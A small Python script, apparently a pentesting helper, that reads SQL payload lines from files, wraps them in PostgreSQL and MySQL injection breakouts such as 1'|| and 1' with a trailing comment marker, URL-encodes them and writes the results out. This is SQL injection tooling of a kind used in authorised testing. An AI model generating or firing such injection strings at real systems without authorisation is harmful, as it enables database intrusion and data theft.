import urllib.parse

file_input_postgres = "sql_postgres.txt"
file_input_my_sql = "sql_mysql.txt"
file_output_postgres = "sql_postgres_output.txt"
file_output_my_sql = "sql_mysql_output.txt"

#Нужно ли кодировать ковычки?


mass = []

#без чистого ввода, в файлах без нагрузок

# Postgress
with open(file_input_postgres) as file:
    for lines in file:
        str_array = []
        lines = lines.replace('\n','')


        #mass.append(lines)

        first_part=["1'||",
                    '1"||',
                    "1' || ",
                    '1" || ']
        second_part=["--"]

        for fistr_part_el in first_part:
            for second_part_el in second_part:
                mass.append(urllib.parse.quote(fistr_part_el + lines + second_part_el))
        
    file.close()

with open(file_output_postgres, "w") as file:
    for  line in mass:
        file.write(line + "\n")

    file.close()

mass = []
#My_Sql
with open(file_input_my_sql) as file:
    for lines in file:
        # просто 
        str_array = []
        lines = lines.replace('\n','')

        #mass.append(lines)

        first_part=["1' ",
                    '1" ',]
        
        second_part=["-- "]

        for fistr_part_el in first_part:
            for second_part_el in second_part:
                mass.append(urllib.parse.quote(fistr_part_el + lines + second_part_el))
        
    file.close()    


 

with open(file_output_my_sql, "w") as file:
    for  line in mass:
        file.write(line + "\n")

    file.close()